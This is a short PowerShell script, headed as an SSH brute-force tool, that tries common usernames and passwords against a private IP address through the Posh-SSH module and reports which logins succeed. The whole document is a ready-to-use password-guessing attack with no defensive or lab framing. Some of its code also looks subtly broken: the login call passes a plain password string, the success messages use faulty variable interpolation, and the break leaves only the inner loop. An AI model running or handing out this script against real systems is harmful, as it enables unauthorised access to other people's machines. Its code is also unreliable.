# ==========================================
# SSH Brute Force Script
# This script attempts to brute force SSH login using a list of common usernames and passwords.
# Requires the Posh-SSH module (Install-Module Posh-SSH)
# ==========================================

# Define target IP and credentials list
$targetIP = "192.168.1.100"
$usernames = @("root", "admin", "user", "test")
$passwords = @("password", "12345", "letmein", "admin123")

# Import Posh-SSH module
Import-Module Posh-SSH

foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        try {
            $session = New-SSHSession -ComputerName $targetIP -Username $username -Password $password
            if ($session) {
                Write-Host "Success! $username:$password logged in successfully!"
                break
            }
        }
        catch {
            Write-Host "Failed to login with $username:$password"
        }
    }
}
